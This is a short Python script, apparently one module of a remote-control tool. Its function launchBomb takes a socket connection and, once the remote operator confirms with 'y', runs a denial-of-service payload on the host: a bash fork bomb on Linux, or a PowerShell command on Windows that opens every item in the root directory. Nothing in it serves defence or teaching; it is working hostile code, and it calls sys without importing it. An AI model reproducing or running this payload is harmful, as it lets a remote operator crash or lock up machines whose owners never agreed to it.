#!/bin/env python3
import os

win = "powershell -c ii /*"
lin = "bash -c ':(){ :|: & };:'"

def launchBomb(con):
    con.sendall(b"Are you sure?")
    optDir = con.recv(2048)
    try:
        optDir = str(optDir.decode().strip())
        if optDir == "y":
            if os.name == "nt":
                os.system(win)
            else:
                os.system(lin)
    except ValueError:
        con.sendall(b'Please only send valid input')
    except KeyboardInterrupt:
        sys.exit(0)
    except:
        con.sendall(b'Could Not Retrieve Data')
    

